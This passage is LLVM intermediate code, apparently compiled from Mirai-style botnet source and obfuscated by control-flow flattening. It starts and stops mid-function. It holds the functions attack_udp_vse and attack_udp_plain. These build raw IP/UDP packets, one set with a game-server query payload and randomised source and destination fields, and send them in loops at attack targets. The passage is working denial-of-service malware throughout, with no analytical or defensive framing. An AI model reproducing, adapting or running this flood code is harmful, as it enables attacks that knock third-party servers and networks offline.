  store i32 813173367, i32* %switchVar
  br label %loopEnd

; <label>:457:                                    ; preds = %loopEntry
  store i32 589934144, i32* %switchVar
  br label %loopEnd

; <label>:458:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %457, %454, %416, %410, %406, %402, %398, %394, %390, %384, %379, %373, %368, %362, %357, %353, %349, %328, %308, %302, %301, %300, %297, %172, %168, %118, %112, %111, %108, %102, %101, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 54)
  %55 = call i8* @table_retrieve_val(i32 54, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 933400787, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 933400787, label %first
    i32 537116809, label %59
    i32 -1399882849, label %60
    i32 -2068944968, label %66
    i32 1049658406, label %69
    i32 -94309714, label %70
    i32 36792184, label %76
    i32 291395648, label %124
    i32 1689028614, label %128
    i32 289307485, label %164
    i32 1833478174, label %167
    i32 -1545954624, label %168
    i32 1340070245, label %169
    i32 776229671, label %175
    i32 1709987183, label %195
    i32 -442906406, label %216
    i32 188785746, label %221
    i32 -1760161345, label %226
    i32 -753200730, label %231
    i32 119331255, label %236
    i32 -680722405, label %241
    i32 -910828847, label %246
    i32 827200328, label %293
    i32 1083764012, label %296
    i32 646367417, label %297
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %57 = icmp eq i32 %.reload, -1
  %58 = select i1 %57, i32 537116809, i32 -1399882849
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 646367417, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %61 = load i32, i32* %10, align 4
  %62 = bitcast i32* %9 to i8*
  %63 = call i32 @setsockopt(i32 %61, i32 0, i32 3, i8* %62, i32 4) #6
  %64 = icmp eq i32 %63, -1
  %65 = select i1 %64, i32 -2068944968, i32 1049658406
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %10, align 4
  %68 = call i32 @close(i32 %67)
  store i32 646367417, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -94309714, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i32, i32* %9, align 4
  %72 = load i8, i8* %5, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp slt i32 %71, %73
  %75 = select i1 %74, i32 36792184, i32 1833478174
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = call noalias i8* @calloc(i64 128, i64 1) #6
  %78 = load i8**, i8*** %11, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8*, i8** %78, i64 %80
  store i8* %77, i8** %81, align 8
  %82 = load i8**, i8*** %11, align 8
  %83 = load i32, i32* %9, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8*, i8** %82, i64 %84
  %86 = load i8*, i8** %85, align 8
  %87 = bitcast i8* %86 to %struct.iphdr*
  store %struct.iphdr* %87, %struct.iphdr** %20, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %89 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %88, i64 1
  %90 = bitcast %struct.iphdr* %89 to %struct.udphdr*
  store %struct.udphdr* %90, %struct.udphdr** %21, align 8
  %91 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %92 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %91, i64 1
  %93 = bitcast %struct.udphdr* %92 to i8*
  store i8* %93, i8** %22, align 8
  %94 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %95 = bitcast %struct.iphdr* %94 to i8*
  %96 = load i8, i8* %95, align 4
  %97 = and i8 %96, 15
  %98 = or i8 %97, 64
  store i8 %98, i8* %95, align 4
  %99 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %100 = bitcast %struct.iphdr* %99 to i8*
  %101 = load i8, i8* %100, align 4
  %102 = and i8 %101, -16
  %103 = or i8 %102, 5
  store i8 %103, i8* %100, align 4
  %104 = load i8, i8* %12, align 1
  %105 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i32 0, i32 1
  store i8 %104, i8* %106, align 1
  %107 = load i32, i32* %19, align 4
  %108 = sext i32 %107 to i64
  %109 = add i64 32, %108
  %110 = trunc i64 %109 to i16
  %111 = call zeroext i16 @htons(i16 zeroext %110) #7
  %112 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %113 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %112, i32 0, i32 2
  store i16 %111, i16* %113, align 2
  %114 = load i16, i16* %13, align 2
  %115 = call zeroext i16 @htons(i16 zeroext %114) #7
  %116 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i32 0, i32 3
  store i16 %115, i16* %117, align 4
  %118 = load i8, i8* %14, align 1
  %119 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %120 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %119, i32 0, i32 5
  store i8 %118, i8* %120, align 4
  %121 = load i8, i8* %15, align 1
  %122 = icmp ne i8 %121, 0
  %123 = select i1 %122, i32 291395648, i32 1689028614
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %126 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %127 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %126, i32 0, i32 4
  store i16 %125, i16* %127, align 2
  store i32 1689028614, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i32 0, i32 6
  store i8 17, i8* %130, align 1
  %131 = load i32, i32* @LOCAL_ADDR, align 4
  %132 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i32 0, i32 8
  store i32 %131, i32* %133, align 4
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 9
  store i32 %139, i32* %141, align 4
  %142 = load i16, i16* %16, align 2
  %143 = call zeroext i16 @htons(i16 zeroext %142) #7
  %144 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %145 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %144, i32 0, i32 0
  store i16 %143, i16* %145, align 2
  %146 = load i16, i16* %17, align 2
  %147 = call zeroext i16 @htons(i16 zeroext %146) #7
  %148 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %149 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %148, i32 0, i32 1
  store i16 %147, i16* %149, align 2
  %150 = load i32, i32* %19, align 4
  %151 = sext i32 %150 to i64
  %152 = add i64 12, %151
  %153 = trunc i64 %152 to i16
  %154 = call zeroext i16 @htons(i16 zeroext %153) #7
  %155 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %156 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %155, i32 0, i32 2
  store i16 %154, i16* %156, align 2
  %157 = load i8*, i8** %22, align 8
  %158 = bitcast i8* %157 to i32*
  store i32 -1, i32* %158, align 4
  %159 = load i8*, i8** %22, align 8
  %160 = getelementptr inbounds i8, i8* %159, i64 4
  store i8* %160, i8** %22, align 8
  %161 = load i8*, i8** %22, align 8
  %162 = load i8*, i8** %18, align 8
  %163 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %161, i8* %162, i32 %163)
  store i32 289307485, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i32, i32* %9, align 4
  %166 = add nsw i32 %165, 1
  store i32 %166, i32* %9, align 4
  store i32 -94309714, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  store i32 -1545954624, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1340070245, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i32, i32* %9, align 4
  %171 = load i8, i8* %5, align 1
  %172 = zext i8 %171 to i32
  %173 = icmp slt i32 %170, %172
  %174 = select i1 %173, i32 776229671, i32 1083764012
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i8**, i8*** %11, align 8
  %177 = load i32, i32* %9, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds i8*, i8** %176, i64 %178
  %180 = load i8*, i8** %179, align 8
  store i8* %180, i8** %23, align 8
  %181 = load i8*, i8** %23, align 8
  %182 = bitcast i8* %181 to %struct.iphdr*
  store %struct.iphdr* %182, %struct.iphdr** %24, align 8
  %183 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i64 1
  %185 = bitcast %struct.iphdr* %184 to %struct.udphdr*
  store %struct.udphdr* %185, %struct.udphdr** %25, align 8
  %186 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %186, i64 %188
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i32 0, i32 2
  %191 = load i8, i8* %190, align 4
  %192 = zext i8 %191 to i32
  %193 = icmp slt i32 %192, 32
  %194 = select i1 %193, i32 1709987183, i32 -442906406
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i32 0, i32 1
  %201 = load i32, i32* %200, align 4
  %202 = call i32 @ntohl(i32 %201) #7
  %203 = call i32 @rand_next()
  %204 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %205 = load i32, i32* %9, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i64 %206
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i32 0, i32 2
  %209 = load i8, i8* %208, align 4
  %210 = zext i8 %209 to i32
  %211 = lshr i32 %203, %210
  %212 = add i32 %202, %211
  %213 = call i32 @htonl(i32 %212) #7
  %214 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 9
  store i32 %213, i32* %215, align 4
  store i32 -442906406, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i16, i16* %13, align 2
  %218 = zext i16 %217 to i32
  %219 = icmp eq i32 %218, 65535
  %220 = select i1 %219, i32 188785746, i32 -1760161345
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = call i32 @rand_next()
  %223 = trunc i32 %222 to i16
  %224 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 3
  store i16 %223, i16* %225, align 4
  store i32 -1760161345, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i16, i16* %16, align 2
  %228 = zext i16 %227 to i32
  %229 = icmp eq i32 %228, 65535
  %230 = select i1 %229, i32 -753200730, i32 119331255
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = call i32 @rand_next()
  %233 = trunc i32 %232 to i16
  %234 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  store i16 %233, i16* %235, align 2
  store i32 119331255, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i16, i16* %17, align 2
  %238 = zext i16 %237 to i32
  %239 = icmp eq i32 %238, 65535
  %240 = select i1 %239, i32 -680722405, i32 -910828847
  store i32 %240, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = call i32 @rand_next()
  %243 = trunc i32 %242 to i16
  %244 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %245 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %244, i32 0, i32 1
  store i16 %243, i16* %245, align 2
  store i32 -910828847, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 7
  store i16 0, i16* %248, align 2
  %249 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %250 = bitcast %struct.iphdr* %249 to i16*
  %251 = call zeroext i16 @checksum_generic(i16* %250, i32 20)
  %252 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 7
  store i16 %251, i16* %253, align 2
  %254 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %255 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %254, i32 0, i32 3
  store i16 0, i16* %255, align 2
  %256 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %257 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %258 = bitcast %struct.udphdr* %257 to i8*
  %259 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %260 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %259, i32 0, i32 2
  %261 = load i16, i16* %260, align 2
  %262 = load i32, i32* %19, align 4
  %263 = sext i32 %262 to i64
  %264 = add i64 12, %263
  %265 = trunc i64 %264 to i32
  %266 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %256, i8* %258, i16 zeroext %261, i32 %265)
  %267 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %268 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %267, i32 0, i32 3
  store i16 %266, i16* %268, align 2
  %269 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %270 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %269, i32 0, i32 1
  %271 = load i16, i16* %270, align 2
  %272 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %273 = load i32, i32* %9, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %272, i64 %274
  %276 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %275, i32 0, i32 0
  %277 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %276, i32 0, i32 1
  store i16 %271, i16* %277, align 2
  %278 = load i32, i32* %10, align 4
  %279 = load i8*, i8** %23, align 8
  %280 = load i32, i32* %19, align 4
  %281 = sext i32 %280 to i64
  %282 = add i64 32, %281
  %283 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %284 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %285 = load i32, i32* %9, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %284, i64 %286
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %287, i32 0, i32 0
  %289 = bitcast %struct.sockaddr_in* %288 to %struct.sockaddr*
  store %struct.sockaddr* %289, %struct.sockaddr** %283, align 8
  %290 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %291 = load %struct.sockaddr*, %struct.sockaddr** %290, align 8
  %292 = call i64 @sendto(i32 %278, i8* %279, i64 %282, i32 16384, %struct.sockaddr* %291, i32 16)
  store i32 827200328, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i32, i32* %9, align 4
  %295 = add nsw i32 %294, 1
  store i32 %295, i32* %9, align 4
  store i32 1340070245, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  store i32 -1545954624, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %296, %293, %246, %241, %236, %231, %226, %221, %216, %195, %175, %169, %168, %167, %164, %128, %124, %76, %70, %69, %66, %60, %59, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  store i32 %49, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -851472865, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -851472865, label %first
    i32 -1604869279, label %52
    i32 -1144329270, label %55
    i32 1071622948, label %58
    i32 1558322446, label %59
    i32 1896944540, label %65
    i32 -262258634, label %75
    i32 -542217857, label %84
    i32 -136802824, label %93
    i32 289689112, label %101
    i32 -1922130791, label %102
    i32 -129015220, label %120
    i32 543484247, label %121
    i32 -1221046690, label %131
    i32 -602971470, label %157
    i32 -546459339, label %175
    i32 1531091719, label %176
    i32 1201943219, label %177
    i32 1114690, label %180
    i32 1546219905, label %181
    i32 -1431249682, label %182
    i32 1461465728, label %188
    i32 1701803620, label %197
    i32 -766079366, label %201
    i32 1025494110, label %211
    i32 1318043846, label %214
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %50 = icmp eq i32 %.reload, 65535
  %51 = select i1 %50, i32 -1604869279, i32 -1144329270
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %13, align 2
  store i32 1071622948, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i16, i16* %13, align 2
  %57 = call zeroext i16 @htons(i16 zeroext %56) #7
  store i16 %57, i16* %13, align 2
  store i32 1071622948, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1558322446, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %9, align 4
  %61 = load i8, i8* %5, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp slt i32 %60, %62
  %64 = select i1 %63, i32 1896944540, i32 1114690
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %67 = load i8**, i8*** %10, align 8
  %68 = load i32, i32* %9, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8*, i8** %67, i64 %69
  store i8* %66, i8** %70, align 8
  %71 = load i16, i16* %12, align 2
  %72 = zext i16 %71 to i32
  %73 = icmp eq i32 %72, 65535
  %74 = select i1 %73, i32 -262258634, i32 -542217857
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = call i32 @rand_next()
  %77 = trunc i32 %76 to i16
  %78 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i64 %80
  %82 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %81, i32 0, i32 0
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %82, i32 0, i32 1
  store i16 %77, i16* %83, align 2
  store i32 -136802824, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i16, i16* %12, align 2
  %86 = call zeroext i16 @htons(i16 zeroext %85) #7
  %87 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %88 = load i32, i32* %9, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i64 %89
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %90, i32 0, i32 0
  %92 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %91, i32 0, i32 1
  store i16 %86, i16* %92, align 2
  store i32 -136802824, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %95 = load i32*, i32** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i32, i32* %95, i64 %97
  store i32 %94, i32* %98, align 4
  %99 = icmp eq i32 %94, -1
  %100 = select i1 %99, i32 289689112, i32 -1922130791
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  ret void

; <label>:102:                                    ; preds = %loopEntry
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %103, align 4
  %104 = load i16, i16* %13, align 2
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %104, i16* %105, align 2
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %107 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %106, i32 0, i32 0
  store i32 0, i32* %107, align 4
  %108 = load i32*, i32** %11, align 8
  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i32, i32* %108, i64 %110
  %112 = load i32, i32* %111, align 4
  %113 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %114 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %114, %struct.sockaddr** %113, align 8
  %115 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %116 = load %struct.sockaddr*, %struct.sockaddr** %115, align 8
  %117 = call i32 @bind(i32 %112, %struct.sockaddr* %116, i32 16) #6
  %118 = icmp eq i32 %117, -1
  %119 = select i1 %118, i32 -129015220, i32 543484247
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 543484247, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
